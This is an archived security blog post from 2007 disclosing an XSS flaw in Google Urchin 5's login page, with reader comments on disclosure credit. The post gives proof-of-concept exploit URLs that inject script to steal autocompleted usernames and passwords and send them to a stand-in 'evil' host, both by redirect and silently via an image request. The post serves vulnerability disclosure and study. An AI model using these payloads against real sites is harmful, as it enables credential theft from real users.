<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="en-US">
	
<!-- Mirrored from www.gnucitizen.org/blog/google-urchin-password-theft-madness/ by HTTrack Website Copier/3.x [XR&CO'2010], Sat, 07 Jul 2012 15:06:33 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8"><!-- /Added by HTTrack -->
<head>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
		<link rel="profile" href="http://gmpg.org/xfn/11"/>
		<link rel="pingback" href="../../wordpress/xmlrpc.php" />
		<link rel="alternate" type="application/rdf+xml" title="GNUCITIZEN" href="../../feed/rdf/index.html"/>
		<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN" href="../../feed/rss/index.html"/>
		<link rel="alternate" type="application/atom+xml" title="GNUCITIZEN" href="../../feed/atom/index.html"/>
		<link rel="stylesheet" type="text/css" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/style.css"/>
		<title>GNUCITIZEN &raquo; Google Urchin password theft madness</title>
			<meta name="google-site-verification" content="yfE2zXU6xxSUp1CWarDop_6vVdGUUplpLF8P5Xe2fWM"/>
	<link rel="icon" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/styles/images/favicon.ico" type="image/x-icon"/>
	<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Comments" href="http://feedproxy.google.com/gnucitizenComments"/>
	<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Group" href="http://feedproxy.google.com/gnucitizenGroup"/>
	<link rel="stylesheet" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/scriptlets/slimbox2/slimbox2.css" type="text/css" media="screen"/>
	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scripts/jquery.core.js" type="text/javascript"></script>
	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scriptlets/slimbox2/slimbox2.js" type="text/javascript"></script>
	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scripts/gnucitizen.common.js" type="text/javascript"></script>
<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN &raquo; Google Urchin password theft madness Comments Feed" href="feed/index.html" />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="../../wordpress/xmlrpc0db0.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.gnucitizen.org/wordpress/wp-includes/wlwmanifest.xml" /> 
<link rel='prev' title='0day: PDF pwns Windows' href='../0day-pdf-pwns-windows/index.html' />
<link rel='next' title='Google GMail E-mail Hijack Technique' href='../google-gmail-e-mail-hijack-technique/index.html' />
<meta name="generator" content="WordPress 3.3.2" />
<link rel='canonical' href='index.html' />
<link rel='shortlink' href='../../index7ab1.html?p=467' />
<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Network" href="http://feedproxy.google.com/gnucitizenNetwork"/>	</head>
	
	<body id="single" class="blog">
		<div id="header">
			<h1><a href="../../index.html"><span>GNUCITIZEN</span></a></h1>
			<p><span>Information Security Think Tank</span></p>
		</div>

<div id="navigation">
	<h2>Navigation</h2>
	<ul>
		<li class="cat-item cat-item-2"><a href="../../categories/blog/index.html" title="View all posts filed under Blog">Blog</a></li>
		<li class="page_item page-item-266"><a href="../../archive/index.html">Archive</a></li>
<li class="page_item page-item-236"><a href="../../about/index.html">About</a></li>
<li class="page_item page-item-336"><a href="../../index.html">Home</a></li>
			</ul>
</div>

<div id="content">
			<div id="entry">
							<div id="post-467" class="post">
	<div class="post-title"><h2><span>Google Urchin password theft madness</span></h2></div>
	<div class="post-date"><span>published:</span> September 24th, 2007</div>
	<div class="post-content"><div class="single-content-top-widgets"></div><p>There is a trivially exploitable XSS vul on <a href="http://www.google.com/search?q=intext%3A%22Urchin+Web+Analytics+v5%22">Google Urchin Web Analytics 5</a>&#8216;s login page. The vulnerability has been tested on versions <code>5.6.00r2</code>, <code>5.7.01</code>, <code>5.7.02</code> and <code>5.7.03</code> (latest). Previous versions are most likely to be affected as well. In case you didn&#8217;t know, <a href="http://www.google.com/analytics/urchin_downloads.html">Google Urchin</a> is the <strong>install</strong> version of Google Analytics.</p>

<p>I reported the issue to Google back on Jul 25 and was confirmed by their security team. They are now working on a fix. My original plan was to publish this info after a fix would be released. However, the issue <a href="http://ha.ckers.org/blog/20070823/xss-and-possible-information-disclosure-in-urchin/">has also been found</a> by other folks about a month ago. As usual, the researcher loses credit when following the responsible disclosure route. Here is the boring POC:</p>

<pre><code>http://target/session.cgi?&quot;&gt;&lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt;&lt;!--</code></pre>

<p>You might have heard before that a XSS vulnerability on a login page is nasty. However most people think that the worst thing you can do is inject a form in order to perform a phishing attack. Although it&#8217;s true this is a good example of what you can do, we can also do more advanced XSS phishing attacks that are even harder to detect. My two favorite tricks when finding a XSS vul on a login page are:</p>

<ul>
<li><strong>Overwriting</strong> the login form&#8217;s <code>action</code> attribute so that the victim&#8217;s username and password are stolen when clicking on Login</li>
<li><strong>Stealing</strong> autocomplete data so that victim username and password are stolen <em>by simply clicking on our exploit URL</em> (juicy!)</li>
</ul>

<p>Anyway, let&#8217;s get to the point. I know that you&#8217;re sick of XSS PoCs that only open alert boxes. So here is a exploit URL that will steal the victim&#8217;s username and password by simply clicking on it. The only requirement is that the victim is using the <q>autocomplete passwords</q> feature, aka <q>Remember passwords for sites</q>:</p>

<pre><code>http://target/session.cgi?&quot;&gt;&lt;/form&gt;&lt;script&gt;setTimeout(&quot;location%3d&apos;http://evil/?usr%3d&apos;%2bdocument.forms[0].user.value%2b&apos;%26pwd%3d&apos;%2bdocument.forms[0].pass.value;&quot;,1500);&lt;/script&gt;&lt;!--</code></pre>

<p>Using <code>location</code> is great for redirecting information to third-party sites. The problem is that the current window will change to show the evil site. Although this is great for demo purposes, it sucks when it comes to being stealth, since the victim can actually see his/her credentials being sent to another website on the address bar. Instead, we can dynamically create an image with JavaScript so <em>the credentials are stolen in the background:</em></p>

<pre><code>http://target/session.cgi?&quot;&gt;&lt;/form&gt;&lt;script&gt;h%3dnew%20Image();setTimeout(&quot;h.src%3d&apos;http://evil/?usr%3d&apos;%2bdocument.forms[0].user.value%2b&apos;%26pwd%3d&apos;%2bdocument.forms[0].pass.value;&quot;,1500);&lt;/script&gt;&lt;!â€“-</code></pre>

<p>The following video shows the previous exploit in action. I don&#8217;t think the quality of the video is that good, but oh well. Basically what it shows is how after visiting the exploit URL, the username and password are sent to google.com in the background. I use Paros in the video to demonstrate that the credentials do indeed get sent to google.com.</p>

<div class="screen"><object width="425" height="350"><param name="movie" value="http://www.youtube.com/v/wCUovL9WLVQ"></param><param name="wmode" value="transparent"></param><embed src="http://www.youtube.com/v/wCUovL9WLVQ" type="application/x-shockwave-flash" wmode="transparent" width="425" height="350"></embed></object></div>

<p>If you look at the code, you&#8217;ll notice that we wait 1.5 secs using the <em>setTimeout()</em> function before forwarding the credentials to the evil site. The reason for this is because we need to let the browser auto-complete the fields before performing the redirect. Otherwise the value of the username and password field would be blank by the time we steal them. </p>

<p><em>The PoC has been tested on the latest version of FF (2.0.0.7 at time of writing) and does <i>not</i> work on IE 7, but <i>might</i> work on IE 6. This doesn&#8217;t mean you cannot do a auto-complete password theft attack on IE 7, it just needs a bit of more work! If you want to know the reason behind this difference is that IE 7 requires the user to first type or choose the username from the auto-complete drop-down menu, <em>before</em> the password field is automatically filled.</em></p><div class="single-content-bottom-widgets"></div></div>
		<div class="post-links"><a href="index.html">more</a> | <a href="index.html#post-comments">comments</a> | <a href='feed/index.html'>comments rss</a> | posted by <a href="../../author/pagvac/index.html" title="Posts by pagvac" rel="author">pagvac</a></div>
	<div class="post-tags">Tags: <a href="../../tags/0day/index.html" rel="tag">0day</a> | <a href="../../tags/google/index.html" rel="tag">google</a> | <a href="../../tags/urchin/index.html" rel="tag">urchin</a> | <a href="../../tags/xss/index.html" rel="tag">xss</a></div></div>
				

				<div id="post-comments">
					<div class="comment even thread-even depth-1" id="comment-52310">
				<div class="comment-author vcard">
		<img alt='' src='http://1.gravatar.com/avatar/997a9fa55e557e2aa8262a07758b161d?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://websecurity.com.ua/' rel='external nofollow' class='url'>MustLive</a></cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-52310">
			September 25, 2007 at 2:17 am</a>		</div>

		<p>Adrian.</p>
<p>As I wrote at my site month ago (<a href="http://websecurity.com.ua/1283/" rel="nofollow">http://websecurity.com.ua/1283/</a>) about this XSS hole  in Urchin, RSnake already wrote about this hole. Like you also mentioned about. But as I and RSnake wrote, there is not only XSS, but also Authorization bypass vulnerability in Urchin. Which give possibility to look at statistic without any login and password!</p>
<blockquote><p>I know that youâ€™re sick of XSS PoCs that only open alert boxes.</p></blockquote>
<p>I&#8217;m not, I like alert boxes :-), especially alert(document.cookie).</p>
<p>Nevertheless, man, nice XSS PoCs and video ;-).</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-52429">
				<div class="comment-author vcard">
		<img alt='' src='http://0.gravatar.com/avatar/44c5e290ccf283471210752d0b1ed6df?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://djteller.blogspot.com/' rel='external nofollow' class='url'>djteller</a></cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-52429">
			September 25, 2007 at 11:00 am</a>		</div>

		<p>Nice work man.<br />
Sorry about the credit issue, but dont worry, you got our respect.</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment even thread-even depth-1" id="comment-52434">
				<div class="comment-author vcard">
		<img alt='' src='http://0.gravatar.com/avatar/ef14ae4ef69235fa6c3709438357819d?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../index.html' rel='external nofollow' class='url'>Adrian Pastor</a></cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-52434">
			September 25, 2007 at 11:11 am</a>		</div>

		<p>Hi MustLive:</p>
<p>Copied and pasted from this very same post:</p>
<blockquote><p>I reported the issue to Google back on Jul 25 and was confirmed by their security team. They are now working on a fix. My original plan was to publish this info after a fix would be released. However, the issue has also been found by other folks about a month ago.</p></blockquote>
<p>In other words, I do mention that it&#8217;s been publicly made a month ago by others, but ALSO that I reported it to Google 2 months ago and that I was waiting for them to fix it BEFORE making it public.</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-53502">
				<div class="comment-author vcard">
		<img alt='' src='http://1.gravatar.com/avatar/997a9fa55e557e2aa8262a07758b161d?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://websecurity.com.ua/' rel='external nofollow' class='url'>MustLive</a></cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-53502">
			September 28, 2007 at 9:14 pm</a>		</div>

		<p>Hi Adrian!</p>
<p>No need to paste your words, I read your whole post carefully ;-). I understand that you was first who found this hole and I believe you (and Google also know that you was first who tell them about this XSS). Some people who found this hole after you outstrip you with disclosure, but you was the first discoverer, so you have respect of me and security community.</p>
<p>I understand you with this situation, when other guys officially disclosed your hole before you. This incidents sometimes happens in webappsec world. I regularly have such experience, when people disclosing holes which I first discover before me, or when people disclosing holes many months after my disclosure.</p>
<p>What I wrote in my previous comment (and what I wrote at my site), that there is another hole in Urchin. It is Authorization bypass vulnerability (which as I know was found by RSnake and you didn&#8217;t mention it in your post). This one gives possibility to enter into account without any login and password. It is also interesting hole as your XSS.</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment even thread-even depth-1" id="comment-53533">
				<div class="comment-author vcard">
		<img alt='' src='http://0.gravatar.com/avatar/ef14ae4ef69235fa6c3709438357819d?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../index.html' rel='external nofollow' class='url'>Adrian Pastor</a></cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-53533">
			September 28, 2007 at 10:56 pm</a>		</div>

		<p>Hey MustLive,</p>
<p>Thanks for your kind words, very much appreciated!</p>
<p>I did read about the unauthenticated access issue and left my comments here: <a href="http://ha.ckers.org/blog/20070823/xss-and-possible-information-disclosure-in-urchin/" rel="nofollow">http://ha.ckers.org/blog/20070.....in-urchin/</a></p>
<blockquote><p>Back in July, when I was searching some examples in Google also noticed that some sites have the Urchin stats wide open, but I thought this was a configuration problem as opposed to a bug.</p>
<p>Are you guys sure there is a <q>authorization bypass hole</q>?</p>
</blockquote>
<p>MustLive, is this a 100% verified issue? Have you guys replicated this in a lab environment? I can&#8217;t make it work on my test installation.</p>

		<div class="reply">
				</div>
		</div>
		</div>
		
		<div class="post-comments-navigation">
			<div class="older-comments"></div>
			<div class="newer-comments"></div>
		</div>
	
	<div id="post-response">
		<h2>Respond</h2>
					<form action="http://www.gnucitizen.org/wordpress/wp-comments-post.php" name="response-form" method="post" class="response-form">
				<p><em>We retain the right to remove any comment or trackback we determine to be, at our sole discretion, unacceptable.</em></p>
									<div><label for="author">name: (required)</label></div>
					<div><input type="text" name="author" id="author" value="" size="20" tabindex="1"/></div>
					<div><label for="email">mail: (required)</label></div>
					<div><input type="text" name="email" id="email" value="" size="20" tabindex="2"/></div>
					<div><label for="url">website:</label></div>
					<div><input type="text" name="url" id="url" value="" size="20" tabindex="3"/></div>
								<div><label for="comment">comment:</label></div>
				<div><textarea name="comment" id="comment" cols="50" rows="10" tabindex="4"></textarea></div>
				<div>
					<input class="button" name="submit" type="submit" id="submit" tabindex="5" value="submit"/>
					<input class="button" name="reset" type="reset" id="reset" tabindex="6" value="reset"/>
				</div>
				<input type="hidden" name="comment_post_ID" value="467"/>
				<p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="7a87698f29" /></p>

	<p style="clear: both;" class="subscribe-to-comments">
	<input type="checkbox" name="subscribe" id="subscribe" value="subscribe" style="width: auto;" />
	<label for="subscribe">Notify me of followup comments via e-mail</label>
	</p>


			</form>
			</div>
					</div>
		<div id="content-sidebar">					<div class="widget">			<p style="font-size:24px"><em>Get <a href="http://www.websecurify.com/">Websecurify</a> - a cross-platform web security testing technology designed from the ground up with simplicity in mind.</em></p>			</div>			</div></div>

				
		<div id="footer">
			
	<script type="text/javascript">
		var gaJsHost = (('https:' == document.location.protocol) ? 'https://ssl.' : 'http://www.');
		document.write(unescape('%3Cscript src="' + gaJsHost + 'google-analytics.com/ga.js" type="text/javascript"%3E%3C/script%3E'));
	</script>
	<script type="text/javascript">
		var pageTracker = _gat._getTracker('UA-363996-1');
		pageTracker._initData();
		pageTracker._trackPageview();
	</script>

				<p>(<a rel="license" href="http://creativecommons.org/licenses/by-nc-nd/2.5/" title="Creative Commons Attribution-Noncommercial-No Derivative Works 2.5 Generic">CC</a>)2005-2012 <a href="../../index.html" title="Information Security Think Tank">GNUCITIZEN</a></p>
		</div>
		
		<!-- <rdf:RDF xmlns="http://web.resource.org/cc/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
			<Work rdf:about="">
				<license rdf:resource="http://creativecommons.org/licenses/by-nc-nd/2.5/"/>
				<dc:title>GNUCITIZEN</dc:title>
				<dc:date>2005-2012</dc:date>
				<dc:creator><Agent><dc:title>GNUCITIZEN</dc:title></Agent></dc:creator>
				<dc:rights><Agent><dc:title>GNUCITIZEN</dc:title></Agent></dc:rights>
				<dc:type rdf:resource="http://purl.org/dc/dcmitype/Text"/>
				<dc:source rdf:resource="http://www.gnucitizen.org"/>
			</Work>
			<License rdf:about="http://creativecommons.org/licenses/by-nc-nd/2.5/">
				<permits rdf:resource="http://web.resource.org/cc/Reproduction"/>
				<permits rdf:resource="http://web.resource.org/cc/Distribution"/>
				<requires rdf:resource="http://web.resource.org/cc/Notice"/>
				<requires rdf:resource="http://web.resource.org/cc/Attribution"/>
				<prohibits rdf:resource="http://web.resource.org/cc/CommercialUse"/>
			</License>
		</rdf:RDF> -->
		
		<!-- tested by blogsecurify -->
		<!-- wpscanner -->
	</body>

<!-- Mirrored from www.gnucitizen.org/blog/google-urchin-password-theft-madness/ by HTTrack Website Copier/3.x [XR&CO'2010], Sat, 07 Jul 2012 15:06:33 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8"><!-- /Added by HTTrack -->
</html>
